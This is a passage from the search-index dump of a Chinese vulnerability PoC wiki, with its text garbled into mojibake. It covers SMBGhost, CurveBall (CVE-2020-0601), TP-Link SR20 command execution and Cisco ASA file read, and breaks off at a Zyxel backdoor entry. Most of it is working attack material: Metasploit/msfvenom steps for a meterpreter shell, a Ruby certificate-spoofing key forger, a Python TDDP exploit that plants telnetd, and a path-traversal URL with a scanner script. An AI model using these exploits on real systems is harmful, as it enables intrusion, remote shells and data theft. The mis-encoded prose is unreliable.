msfvenomç”Ÿæˆreversed shellcode msfvenom -p windows/x64/meterpreter/bind_tcp lport=2333 -f py -o exp.py å°†ç”Ÿæˆexp.pyä¸­çš„shellcodeæ›¿æ¢exploit.pyä¸­çš„shellcode [!NOTE] buf è¦æ›¿æ¢ä¸º USER_PAYLOAD ä½¿ç”¨ MSF msf5 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp payload => windows/x64/meterpreter/bind_tcp msf5 exploit(multi/handler) > set lport 2333 lport => 2333 msf5 exploit(multi/handler) > set rhost 192.168.1.110 rhost => 192.168.1.110 msf5 exploit(multi/handler) > exploit æ‰§è¡Œè„šæœ¬å³å¯ python3 exploit.py -ip 192.168.1.110 [!NOTE] æ³¨æ„æœ‰è“å±æ¦‚ç‡ å‚è€ƒæ–‡ç«  Windows SMB Ghostï¼ˆCVE-2020-0796ï¼‰æ¼æ´åˆ†æ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Windows CryptoAPIæ¬ºéª—æ¼æ´ CVE-2020-0601.html":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Windows CryptoAPIæ¬ºéª—æ¼æ´ CVE-2020-0601.html","title":"Windows CryptoAPIæ¬ºéª—æ¼æ´ CVE-2020-0601","keywords":"","body":"Windows CryptoAPIæ¬ºéª—æ¼æ´ CVE-2020-0601 æ¼æ´æè¿° 1æœˆ15æ—¥ï¼Œå¾®è½¯å‘å¸ƒäº†é’ˆå¯¹CVE-2020-0601çš„å®‰å…¨è¡¥ä¸ï¼Œè¯¥æ¼æ´æ˜¯å¾®è½¯åœ¨å®ç°æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•æ•°å­—è¯ä¹¦éªŒè¯æ—¶äº§ç”Ÿï¼Œå¯è¢«åˆ©ç”¨äºä¼ªé€ æ¥è‡ªå¯ä¿¡ä»»æ¥æºçš„ç­¾åæˆ–è¯ä¹¦ï¼Œå¹¶ä¸”å› å…¶ä¸šåŠ¡ç‰¹æ€§ä¼šè¡ç”Ÿå‡ºå¤šç§æ”»å‡»å‘é‡ï¼Œå…·æœ‰æé«˜çš„å¯åˆ©ç”¨ä»·å€¼å’Œæå¤§çš„æ½œåœ¨ç ´ååŠ›ï¼ŒWin 10å’Œwindows server 2016 & 2019ä¹Ÿéƒ½åœ¨å…¶å½±å“èŒƒå›´å†…ã€‚è¯¥æ¼æ´ç”±ç¾å›½NSAå›½å®¶å®‰å…¨å±€å‘ç°åæ±‡æŠ¥ç»™å¾®è½¯å…¬å¸ï¼Œä¹Ÿè¢«è®¤ä¸ºæ˜¯ç¬¬ä¸€ä¸ªNSAå…¬å¼€æŠ«éœ²çš„è½¯ä»¶ç³»ç»Ÿæ¼æ´ï¼Œå½“ç„¶ä¹Ÿæœ‰å¯èƒ½å­˜åœ¨å…¶ç‰¹æ®Šçš„æˆ˜æœ¯ç›®çš„ã€‚ç»¿ç›Ÿç§‘æŠ€M01Næ”»å‡»å®‰å…¨ç ”ç©¶å›¢é˜Ÿå¯¹æ­¤æ¼æ´åŸç†è¿›è¡Œäº†è¯¦ç»†åˆ†æå¹¶å¤ç°äº†å¤šç§å¯èƒ½çš„æ”»å‡»æ–¹æ³•ï¼Œæå‡ºäº†è¯¦ç»†çš„æ£€æµ‹åŠæ•´æ”¹æ–¹æ¡ˆã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] å¸¦æœ‰æŒ‡å®šå‚æ•°çš„ECCå¯†é’¥çš„è¯ä¹¦çš„Microsoft Windowsç‰ˆæœ¬ ä¾èµ–äºWindows CryptoAPIçš„åº”ç”¨ç¨‹åº æ¼æ´å¤ç° æ¼æ´åŸç† CVE-2020-0601çš„æ ¹æºæ˜¯å¾®è½¯çš„åŠ å¯†åº“crypt32.dllä¸­æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•çš„å®ç°é—®é¢˜ï¼Œé¦–å…ˆæˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹æ¤­åœ†åŠ å¯†ç®—æ³•çš„åŸºæœ¬åŸç†ã€‚ è¦å½¢è±¡åœ°ç†è§£æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ï¼Œå¯ä»¥ç»“åˆå›¾å½¢æ¥çœ‹ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªç¬¦åˆæ¤­åœ†æ›²çº¿çš„æ–¹ç¨‹y2 = x3 + ax + bï¼Œå›¾åƒå¦‚ä¸‹ï¼š æ¤­åœ†æ›²çº¿å…·æœ‰çš„ä¸€äº›ç‹¬ç‰¹çš„æ€§è´¨ä½¿å®ƒé€‚åˆç”¨äºåŠ å¯†ç®—æ³•ï¼š æ¤­åœ†æ›²çº¿å…³äºxè½´å¯¹ç§° ä»»ä½•ä¸€æ¡éå‚ç›´çš„çº¿ä¸æ›²çº¿æœ€å¤šæœ‰ä¸‰ä¸ªç‚¹ç›¸äº¤ æ›²çº¿æ˜¯å…‰æ»‘çš„ï¼Œå³æ›²çº¿çš„æ‰€æœ‰ç‚¹éƒ½æ²¡æœ‰ä¸¤ä¸ªæˆ–è€…ä¸¤ä¸ªä»¥ä¸Šçš„ä¸åŒçš„åˆ‡çº¿ åœ¨æ¤­åœ†æ›²çº¿ä¸Šä»»æ„ä¸¤ç‚¹Aã€Bï¼ˆè‹¥Aã€Bé‡åˆåˆ™ä½œAçš„åˆ‡çº¿ï¼‰ï¼Œä½œç›´çº¿äº¤äºæ¤­åœ†æ›²çº¿å¦ä¸€ç‚¹Cï¼Œè¿‡Cåšyè½´çš„å¹³è¡Œçº¿ä¸æ¤­åœ†æ›²çº¿äº¤äºCç‚¹ï¼Œå®šä¹‰A+B=Cã€‚æ¤­åœ†æ›²çº¿çš„åŠ æ³•ç¬¦åˆäº¤æ¢å¾‹å’Œç»“åˆå¾‹ã€‚ å¦‚æœAã€Bæ˜¯åŒä¸€ä¸ªç‚¹ï¼Œåˆ™è¿‡Aä½œæ¤­åœ†æ›²çº¿çš„åˆ‡çº¿ï¼Œä»¥åŒæ ·çš„æ–¹æ³•å¾—åˆ°å¯¹åº”çš„ç»“æœ C=2A ã€‚ æ¥ä¸‹æ¥æ˜¯æ¤­åœ†æ›²çº¿åŠ å¯†ç›¸å…³çš„é‡ç‚¹ï¼Œå¦‚æœå¯¹å¤šä¸ªAè¿›è¡Œç´¯åŠ ,åˆ™å¯ä¾æ¬¡ç´¯åŠ è¿çº¿å¾—åˆ°nAçš„å€¼ ã€‚ èµ·ç‚¹ä¸ºAï¼Œç»ˆç‚¹D=3Aï¼Œé˜¶ä¸º3 ã€‚ èµ·ç‚¹ä¸ºAï¼Œç»ˆç‚¹G=4Aï¼Œé˜¶ä¸º4ã€‚ æ¤­åœ†æ›²çº¿åŠ å¯† è€ƒè™‘K=kGï¼Œå…¶ä¸­Kã€Gä¸ºæ¤­åœ†æ›²çº¿Ep(a,b)ä¸Šçš„ç‚¹ï¼Œnä¸ºGçš„é˜¶ã€‚kä¸ºå°äºnçš„æ•´æ•°ã€‚åˆ™ç»™å®škå’ŒGï¼Œæ ¹æ®åŠ æ³•æ³•åˆ™ï¼Œè®¡ç®—Kå¾ˆå®¹æ˜“ï¼ˆåªè¦é€æ¬¡æ±‚è§£ï¼‰ä½†åè¿‡æ¥ï¼Œç»™å®šKå’ŒGï¼Œæ±‚kå°±éå¸¸å›°éš¾ã€‚å› ä¸ºå®é™…ä½¿ç”¨ä¸­çš„ECCåŸåˆ™ä¸ŠæŠŠç§é’¥kå–å¾—ç›¸å½“å¤§ï¼Œnä¹Ÿç›¸å½“å¤§ï¼Œä¸”æ¤­åœ†æ›²çº¿ä¸å†è¿ç»­è€Œæ˜¯åœ¨å®æ•°å†…ç¦»æ•£çš„å€¼ï¼Œè¦æŠŠnä¸ªè§£ç‚¹é€ä¸€ç®—å‡ºå‡ ä¹æ˜¯ä¸å¯èƒ½çš„ã€‚è¿™å°±æ˜¯æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•çš„æ•°å­¦ä¾æ® ã€‚ ç‚¹Gç§°ä¸ºåŸºç‚¹ k(k Kä¸ºå…¬å¼€å¯†é’¥ æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ï¼ˆECCï¼‰å’ŒRSAä¸€æ ·æ˜¯ä¸€ç§å…¬å¼€å¯†é’¥åŠ å¯†æŠ€æœ¯ï¼Œå¯¹åŸå§‹æ•°æ®ä»¥å…¬é’¥åŠ å¯†ï¼Œä»¥ç§é’¥è§£å¯†ï¼Œå³ä¾¿æ”»å‡»è€…è·å–å¯†æ–‡å’Œå…¬é’¥ä¹Ÿæ— æ³•ï¼ˆåœ¨åˆç†çš„æ—¶é—´æˆ–ä»£ä»·ä¸‹ï¼‰è§£å¯†è·å–æ˜æ–‡ã€‚ åŒæ ·çš„ï¼Œæ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ï¼ˆECCï¼‰ä¹Ÿè¢«ç”¨äºæ•°å­—ç­¾åï¼Œä»¥ç§é’¥åŠ å¯†ç”Ÿæˆç­¾åï¼Œä»¥å…¬é’¥è§£å¯†éªŒè¯ç­¾åï¼Œå¦‚æœå’ŒåŸæ–‡ä¸€æ ·åˆ™ç­¾åéªŒè¯æˆåŠŸã€‚ å…¬å¼€å¯†é’¥åŠ å¯†ä¹‹æ‰€ä»¥å¯é æ˜¯å› ä¸ºå®ƒä»¬åˆ©ç”¨äº†å…¬é’¥å¯†ç é¢†åŸŸçš„å•å‘å‡½æ•°åŸç†ï¼Œæ­£å‘æ“ä½œéå¸¸ç®€å•ï¼Œè€Œé€†å‘æ“ä½œéå¸¸å›°éš¾ã€‚ ç”±Gï¼ˆåŸºç‚¹ï¼‰å‡ºå‘ï¼Œè¿›è¡Œkï¼ˆç§é’¥ï¼‰æ¬¡å˜æ¢ï¼Œåªè¦æŒ‰éƒ¨å°±ç­åœ°è®¡ç®—ï¼Œå°±èƒ½å¾ˆå®¹æ˜“åœ°å¾—åˆ°ç»ˆç‚¹Kï¼ˆå…¬é’¥ï¼‰çš„å€¼ã€‚ å·²çŸ¥èµ·ç‚¹Gï¼ˆåŸºç‚¹ï¼‰å’Œç»ˆç‚¹Kï¼ˆå…¬é’¥ï¼‰ï¼Œè¦é€†æ¨å¾—åˆ°ç§»åŠ¨æ¬¡æ•°kï¼ˆç§é’¥ï¼‰åˆ™æ˜¯ä¸€ä¸ªå¾ˆéš¾çš„é—®é¢˜ï¼ˆæœ€ä½³ç®—æ³•ä¹Ÿè¾¾åˆ°äº†å…¨æŒ‡æ•°å¤æ‚åº¦ï¼‰ ç›¸æ¯”ä¼ ç»ŸRSAåŠ å¯†ç®—æ³•ï¼Œæ¤­åœ†åŠ å¯†ç®—æ³•å…·æœ‰ç€å¤©ç”Ÿçš„ä¼˜åŠ¿ï¼Œæ¤­åœ†åŠ å¯†ç®—æ³•çš„é€†å‘è¿‡ç¨‹ç›¸æ¯”RSAæœ‰ç€æ›´å¤§çš„æ—¶é—´å¤æ‚åº¦ã€‚åœ¨å¯†é’¥é•¿åº¦ç›¸åŒçš„æƒ…å†µä¸‹ï¼Œæ¤­åœ†åŠ å¯†ç®—æ³•ç›¸æ¯”RSAå…·æœ‰æ›´å¥½çš„å®‰å…¨å¼ºåº¦ã€‚ä¸€èˆ¬è®¤ä¸ºï¼Œ160æ¯”ç‰¹çš„æ¤­åœ†æ›²çº¿å¯†é’¥å³å¯æä¾›ä¸1024æ¯”ç‰¹çš„RSAå¯†é’¥ç›¸å½“çš„å®‰å…¨å¼ºåº¦ã€‚ è¾ƒçŸ­çš„å¯†é’¥ä¹Ÿæ„å‘³ç€æ›´å°‘çš„å­˜å‚¨ç©ºé—´ã€æ›´å¿«çš„åŠ è§£å¯†é€Ÿåº¦å’Œæ›´å°‘çš„å¸¦å®½æ¶ˆè€—ï¼Œæ­£å› ä¸ºæ¤­åœ†åŠ å¯†ç®—æ³•çš„è¿™äº›ä¼˜åŠ¿ï¼Œå®ƒè¢«ç”¨äºWindowsçš„ç­¾åç³»ç»Ÿã€httpsçš„è¯ä¹¦ã€æ¯”ç‰¹å¸ç³»ç»Ÿå’Œä¸­å›½çš„äºŒä»£èº«ä»½è¯ç³»ç»Ÿä¸­ã€‚ è™½ç„¶æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•å…·æœ‰ç€è®¸å¤šä¼˜åŠ¿ï¼Œçº¯ç®—æ³•è§’åº¦ç ´è§£éš¾åº¦æå¤§ï¼Œå¾®è½¯å¯¹æ­¤ç®—æ³•çš„å®ç°çš„ç¼ºæ¼å´ç»™æ¼æ´åˆ©ç”¨æä¾›äº†å¯ä¹˜ä¹‹æœºã€‚å›åˆ°æ¤­åœ†æ›²çº¿åŠ å¯†æœ€åŸºæœ¬çš„ç­‰å¼ K=kGï¼Œé¦–å…ˆéœ€è¦æ˜ç¡®çš„æ˜¯ï¼Œè™½ç„¶å¯¹äºç»™å®šçš„åŸºç‚¹Gå’Œå…¬é’¥Kï¼Œè¦æ±‚è§£ç§é’¥kå¾ˆå›°éš¾ï¼Œä½†æ˜¯å¦‚æœå¯ä»¥ä»»æ„æŒ‡å®šåŸºç‚¹Gï¼Œè¦æ„é€ ä¸€å¯¹kå’ŒGä½¿ç­‰å¼æˆç«‹å´æå…¶ç®€å•ï¼›æœ€ç®€å•çš„æƒ…å†µï¼Œä»¤åŸºç‚¹G=Kï¼Œåˆ™ç§é’¥k=1ï¼Œè¿™æ ·ä¸€å¯¹åŸºç‚¹å’Œç§é’¥å¯ä»¥ä½¿ç­‰å¼æˆç«‹ï¼Œä¹Ÿæ˜¯æœ‰æ•ˆçš„è§£ã€‚ åœ¨æ­£å¸¸çš„æ ‡å‡†æ¤­åœ†æ›²çº¿ç®—æ³•ä¸­ï¼ŒåŸºç‚¹Gå¹¶ä¸æ˜¯éšæ„æŒ‡å®šçš„ï¼Œè€Œæ˜¯æœ‰å›ºå®šçš„å€¼ï¼ˆæ ‡å‡†çš„ä½œç”¨ï¼Œä¾¿æ˜¯å¯¹åŸºç‚¹Gç­‰å‚æ•°çš„é€‰æ‹©åšå‡ºè§„å®šï¼‰ï¼Œä¾‹å¦‚åœ¨secp256r1ç‰ˆæœ¬çš„æ¤­åœ†æ›²çº¿ç®—æ³•ä¸­ï¼ŒåŸºç‚¹Gåº”å½“ä¸ºæ ‡å‡†è§„å®šçš„å›ºå®šå€¼ï¼Œå¦‚æœå¯¹å‚æ•°ä¸åŠ éªŒè¯ï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰ä¼ å…¥çš„åŸºç‚¹Gçš„å€¼ï¼ˆä½œä¸ºå‡½æ•°çš„å‚æ•°ï¼‰ï¼Œä¸Šé¢çš„ç§é’¥k=1çš„ç‰¹æ®Šè§£å³å¯æˆç«‹ã€‚ åœ¨æœ‰æ¼æ´ç‰ˆæœ¬çš„crypt32.dllä¸­éªŒè¯ä½¿ç”¨ECCç®—æ³•ç­¾åéƒ¨åˆ†çš„å‡½æ•°æ°æ°æ˜¯è¿™ä¸ªæƒ…å†µï¼ŒåŸå…ˆçš„å‡½æ•°æœªåŠ å‚æ•°éªŒè¯ï¼Œå‚ä¸è®¡ç®—çš„åŸºç‚¹Gçš„å†…å®¹ç”±è¢«éªŒè¯çš„è¯ä¹¦éšæ„æŒ‡å®šï¼Œä½¿æœªæˆæƒçš„è¯ä¹¦èƒ½å¤Ÿæ„å»ºç§é’¥k=1çš„ç‰¹æ®Šè§£æ¥æˆåŠŸé€šè¿‡æ¤­åœ†åŠ å¯†ç®—æ³•çš„ç­¾åéªŒè¯çš„è¿‡ç¨‹ã€‚ è®©æˆ‘ä»¬ä»¥CVE-2020-0601çš„ä¸€ä¸ªPOCä¸ºä¾‹æ¥è§£æè™šå‡å¯†é’¥çš„æ„å»ºè¿‡ç¨‹ï¼š require 'openssl' raw = File.read ARGV[0] # è¯»å–ä½¿ç”¨ECCç®—æ³•çš„è¯ä¹¦æ–‡ä»¶ ca = OpenSSL::X509::Certificate.new(raw) # è¯»å–ä½¿ç”¨ECCç®—æ³•çš„è¯ä¹¦ ca_key = ca.public_key # ä»è¯ä¹¦ä¸­æå–å…¬é’¥ca_key ca_key.private_key = 1 # è®¾ç½®ç§é’¥ä¸º1ï¼Œä½¿å¾—å…¬é’¥K==1*åŸºç‚¹Gçš„ç­‰å¼æˆç«‹ group = ca_key.group group.set_generator(ca_key.public_key, group.order, group.cofactor) group.asn1_flag = OpenSSL::PKey::EC::EXPLICIT_CURVE ca_key.group = group # åˆ©ç”¨æ„å»ºçš„å‡åŸºç‚¹Gå’Œå‡å¯†é’¥kè®¾ç½®æ–°group File.open(\"spoofed_ca.key\", 'w') { |f| f.write ca_key.to_pem } # å°†æ–°çš„groupå†™å…¥æ–‡ä»¶ ä¿®è¡¥åçš„Crypt32.dllä¸­æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•çš„å‡½æ•°å·²åŠ å…¥äº†å‚æ•°éªŒè¯çš„éƒ¨åˆ†ï¼Œè§£å†³äº†ç”±è‡ªç”±æŒ‡å®šå‚æ•°Gå¯¼è‡´çš„æ„é€ ç¬¬äºŒä¸ªç‰¹æ®Šçš„æœ‰æ•ˆå¯†é’¥çš„é—®é¢˜ã€‚ ä¸€å¤„éªŒè¯æœºåˆ¶çš„å¤±è¯¯å¯¼è‡´ä¿¡ä»»é“¾çš„è¿é”ååº”ã€‚ ç°ä»£çš„å®‰å…¨ç³»ç»Ÿä¸­å­˜åœ¨ç€â€œä¿¡ä»»é“¾â€çš„æ¦‚å¿µï¼Œä¿¡ä»»é“¾çš„ä¸Šä¸‹çº§å­˜åœ¨ä¸€ç§ç±»ä¼¼å•å‘æ‹…ä¿çš„å…³ç³»ï¼Œå­çº§è¯ä¹¦çš„å¯é æ€§ç”±ç­¾åå…¶çš„çˆ¶çº§è¯ä¹¦æ‹…ä¿ã€‚ç­¾åæ—¶ç”±æ ¹è¯ä¹¦å¼€å§‹ä¸€çº§çº§å‘ä¸‹ç­¾åï¼ŒéªŒè¯æ—¶åˆ™é€å±‚æº¯æºéªŒè¯ï¼Œç›´åˆ°æ‰¾åˆ°ä¿¡ä»»çš„æ ¹è¯ä¹¦æ–‡ä»¶ï¼Œæ„æˆäº†ä¸€æ¡ä¿¡ä»»é“¾ã€‚ä½äºæ•´ä¸ªâ€œä¿¡ä»»é“¾â€æœ€ä¸Šæ–¹çš„æ˜¯æœ€ä¸ºé‡è¦ä¸éœ€è¦è‡ªè¯èº«ä»½çš„æ ¹è¯ä¹¦ã€‚æ ¹è¯ä¹¦ä¸€èˆ¬éšç³»ç»Ÿé™„å¸¦æˆ–ç”±ç®¡ç†å‘˜å®‰è£…åœ¨ç³»ç»Ÿå†…ã€‚ è¿™ä¸ªæ¼æ´çš„å­˜åœ¨åˆ™ä½¿å¾—æ„é€ çš„æ— æ•ˆç­¾åé€šè¿‡äº†éªŒè¯æœºåˆ¶ï¼Œä½¿æœ¬åº”æ–­è£‚çš„ä¿¡ä»»é“¾è¢«åˆ©ç”¨ï¼Œé€çº§æ‹…ä¿ç»§ç»­ä¸‹å»ï¼Œæœ€ç»ˆä½¿éæ³•å†…å®¹è·å¾—äº†è¯ä¹¦æ‰€æœ‰è€…çš„åˆæ³•ç­¾åèº«ä»½ã€‚ æ¼æ´åˆ©ç”¨ https://github.com/ollypwn/CurveBall å‚è€ƒæ–‡ç«  cve-2020-0601-windows-cryptoapiæ¬ºéª—æ¼æ´åˆ†æ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/è·¯ç”±å™¨æ¼æ´/":{"url":"PeiQi_Wiki/è·¯ç”±å™¨æ¼æ´/","title":"è·¯ç”±å™¨æ¼æ´","keywords":"","body":"è·¯ç”±å™¨æ¼æ´ğŸ¦Š WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/è·¯ç”±å™¨æ¼æ´/TP-Link/":{"url":"PeiQi_Wiki/è·¯ç”±å™¨æ¼æ´/TP-Link/","title":"TP-Link","keywords":"","body":"TP-Link TP-Link SR20 è¿œç¨‹å‘½ä»¤æ‰§è¡Œ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/è·¯ç”±å™¨æ¼æ´/TP-Link/TP-Link SR20 è¿œç¨‹å‘½ä»¤æ‰§è¡Œ.html":{"url":"PeiQi_Wiki/è·¯ç”±å™¨æ¼æ´/TP-Link/TP-Link SR20 è¿œç¨‹å‘½ä»¤æ‰§è¡Œ.html","title":"TP-Link SR20 è¿œç¨‹å‘½ä»¤æ‰§è¡Œ","keywords":"","body":"TP-Link SR20 è¿œç¨‹å‘½ä»¤æ‰§è¡Œ æ¼æ´æè¿° æ®å¤–åª’æŠ¥é“ï¼Œè‘—åå®‰å…¨ä¸“å®¶ã€Google å®‰å…¨å·¥ç¨‹å¸ˆMatthew Garrettå…¬å¼€äº†TP-LINK SR20æ™ºèƒ½å®¶å±…è·¯ç”±å™¨ä¸€ä¸ªâ€œå…è®¸æ¥è‡ªæœ¬åœ°ç½‘ç»œè¿æ¥çš„ä»»æ„å‘½ä»¤æ‰§è¡Œâ€çš„æ¼æ´ã€‚æ”»å‡»è€…å¯é€šè¿‡è¯¥æ¼æ´æ§åˆ¶ç”¨æˆ·è·¯ç”±å™¨ï¼Œå€Ÿæ­¤æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå±åŠç”¨æˆ·éšç§å®‰å…¨ã€‚ æ¼æ´å½±å“ [!NOTE] TP-Link SR20 æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 # Create /testfile in your tftp root directory with the followingcontents: #function config_test(config) # os.execute(\"telnetd -l/bin/login.sh\") #end # Replace 192.168.0.1 with the IP address of the vulnerable device importbinascii importsocket port_send = 1040 port_receive = 61000 tddp_ver = \"01\" tddp_command = \"31\" tddp_req = \"01\" tddp_reply = \"00\" tddp_padding = \"%0.16X\"% 00 tddp_packet = \"\".join([tddp_ver, tddp_command, tddp_req,tddp_reply, tddp_padding]) sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock_receive.bind(( '', port_receive)) # Send a request sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) packet = binascii.unhexlify(tddp_packet) packet = packet + b\"/testfile;arbitrary\" print(packet) sock_send.sendto(packet, ( \"192.168.0.1\", port_send)) sock_send.close() response, addr = sock_receive.recvfrom( 1024) r = response.encode( 'hex') print(r) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/è·¯ç”±å™¨æ¼æ´/Cisco/":{"url":"PeiQi_Wiki/è·¯ç”±å™¨æ¼æ´/Cisco/","title":"Cisco","keywords":"","body":"Cisco CISCO ASAè®¾å¤‡ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2020-3452 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/è·¯ç”±å™¨æ¼æ´/Cisco/CISCO ASAè®¾å¤‡ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2020-3452.html":{"url":"PeiQi_Wiki/è·¯ç”±å™¨æ¼æ´/Cisco/CISCO ASAè®¾å¤‡ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2020-3452.html","title":"CISCO ASAè®¾å¤‡ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2020-3452","keywords":"","body":"CISCO ASAè®¾å¤‡ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2020-3452 æ¼æ´æè¿° Cisco Adaptive Security Appliance (ASA) é˜²ç«å¢™è®¾å¤‡ä»¥åŠCisco Firepower Threat Defense (FTD)è®¾å¤‡çš„WEBç®¡ç†ç•Œé¢å­˜åœ¨æœªæˆæƒçš„ç›®å½•ç©¿è¶Šæ¼æ´å’Œè¿œç¨‹ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…è¿›è¡Œç›®å½•éå†æ”»å‡»å¹¶è¯»å–ç›®æ ‡ç³»ç»Ÿä¸Šçš„æ•æ„Ÿæ–‡ä»¶ï¼Œæ­¤æ¼æ´ä¸èƒ½ç”¨äºè·å–å¯¹ASAæˆ–FTDç³»ç»Ÿæ–‡ä»¶æˆ–åº•å±‚æ“ä½œç³»ç»Ÿ(OS)æ–‡ä»¶çš„è®¿é—®ï¼Œæ‰€ä»¥åªèƒ½è¯»å–webç³»ç»Ÿç›®å½•çš„æ–‡ä»¶ï¼Œæ¯”å¦‚webvpnçš„é…ç½®æ–‡ä»¶ã€ä¹¦ç­¾ã€ç½‘ç»œcookiesã€éƒ¨åˆ†ç½‘ç»œå†…å®¹å’Œè¶…æ–‡æœ¬ä¼ è¾“åè®®ç½‘å€ç­‰ä¿¡æ¯ã€‚ å½±å“ç‰ˆæœ¬ Cisco ASAè®¾å¤‡ Cisco FTDè®¾å¤‡ FOFA [!NOTE] /+CSCOE+/ Cisco-ASA æ¼æ´å¤ç° FOFAè¯­å¥æŸ¥æ‰¾ POCå¦‚ä¸‹ https://xxx.xxx.xxx.xxx/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ ä¼šä¸‹è½½å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys import urllib3 def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Cisco \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CVE-2020-1956 \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vnln_url = target_url + \"/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36\" } urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) response = requests.get(url=vnln_url, headers=headers, verify=False ,timeout=20) if \"Bad Request\" in response.text: print(\"\\033[31m[x] æ¼æ´å·²ä¿®å¤ \\033[0m\") else: print(\"\\033[32m[o] å­˜åœ¨æ¼æ´ï¼Œå“åº”ä¸º\\n\\033[0m\",response.text) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/è·¯ç”±å™¨æ¼æ´/Zyxel/":{"url":"PeiQi_Wiki/è·¯ç”±å™¨æ¼æ´/Zyxel/","title":"Zyxel","keywords":"","body":"Zyxel Zyxel ç¡¬ç¼–ç åé—¨è´¦æˆ·æ¼æ´ CVE-2020-29583 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/è·¯ç”±å™¨æ¼æ´/Zyxel/Zyxel ç¡¬ç¼–ç åé—¨è´¦æˆ·æ¼æ´ CVE-2020-29583.html":{"url":"PeiQi_Wiki/è·¯ç”±å™¨æ¼æ´/Zyxel/Zyxel ç¡¬ç¼–ç åé—¨è´¦æˆ·æ¼æ´ CVE-2020-29583.html","title":"Zyxel ç¡¬ç¼–ç åé—¨è´¦æˆ·æ¼æ´ CVE-2020-29583","keywords":"","body":"Zyxel ç¡¬ç¼–ç åé—¨è´¦æˆ·æ¼æ´ CVE-2020-29583 æ¼æ´æè¿° Zyxelå›ºä»¶ä¸­å‘ç°çš„åé—¨è¢«ç§°ä¸ºå…³é”®å›ºä»¶æ¼æ´ï¼ŒCVEç¼–å·CVE-2020-29583ï¼Œå¾—åˆ†ä¸º7.8 CVSSã€‚è™½ç„¶CVSSè¯„åˆ†çœ‹ä¼¼ä¸æ˜¯å¾ˆé«˜ï¼Œä½†å´ä¸å¯å°è§‘ã€‚ç ”ç©¶äººå‘˜è¡¨ç¤ºï¼Œè¿™æ˜¯ä¸€ä¸ªæä¸ºä¸¥é‡çš„æ¼æ´ï¼Œæ‰€æœ‰è€…å¿…é¡»ç«‹å³æ›´æ–°å…¶ç³»ç»Ÿã€‚å› 